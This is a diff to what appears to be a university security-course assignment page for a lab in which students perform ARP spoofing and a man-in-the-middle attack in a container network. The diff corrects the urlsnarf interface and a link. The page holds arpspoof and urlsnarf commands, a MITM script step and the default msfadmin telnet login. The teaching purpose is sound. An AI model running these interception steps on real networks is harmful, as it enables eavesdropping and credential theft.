@@ -20,7 +20,7 @@ You will be submitting one code file as well as [arp.py](arp.py.html) ([src](arp
 
 Any changes to this page will be put here for easy reference.  Typo fixes and minor clarifications are not listed here.  <!-- So far there aren't any significant changes to report. -->
 
-- Fri, Feb 2: Clarified that the command, for the MITM attack, should be `telnet`, not `ssh`
+- Fri, Feb 2: Clarified that the command, for the MITM attack, should be `telnet`, not `ssh`; also clarified that `urlsnarf` on *outer1* should run on `eth1`, not `eth0`
 
 
 ### Built-in Commands
@@ -105,7 +105,7 @@ Load up 5 tabs:
 - Tab 2: connect to *outer1* and run:`arpspoof -i eth1 -t 192.168.100.102 192.168.100.1`
 - Tab 3: connect to *outer1* and run: `arpspoof -i eth1 -t 192.168.100.1 192.168.100.102`
   - Note that the IP addresses are reversed in that second command!
-- Tab 4: connect to *outer1* and run: `urlsnarf -i eth0`
+- Tab 4: connect to *outer1* and run: `urlsnarf -i eth1`
   - This will display URLs it sees in the intercepted packets
 - Tab 5: wait a minute, then connect to *outer2* and run: `wget -q http://google.com`
 
@@ -126,7 +126,7 @@ Next we are going to execute the MITM (in-the-middle) attack via an ARP spoof; t
 - Run `arpspoof` in two terminals on *outer1*.
   - `arpspoof -i eth1 -t 192.168.100.3 192.168.100.1`
   - `arpspoof -i eth1 -t 192.168.100.1 192.168.100.3`
-- Download the [arp_mitm.py](../../slides/code/arp_mitm.py.html) ([src](../../slides/arp_mitm.py)) file
+- Download the [arp_mitm.py](../../slides/code/arp_mitm.py.html) ([src](../../slides/code/arp_mitm.py)) file
 - Run that file on *outer1*
 - Connect to *firewall* via `docker exec`.  If you connect via `telnet`, then that will (correctly) populate the ARP cache, negating our hack.
 - From *firewall*, telnet into *metasploit* (`telnet msfadmin@metasploit`, password is `msfadmin`).
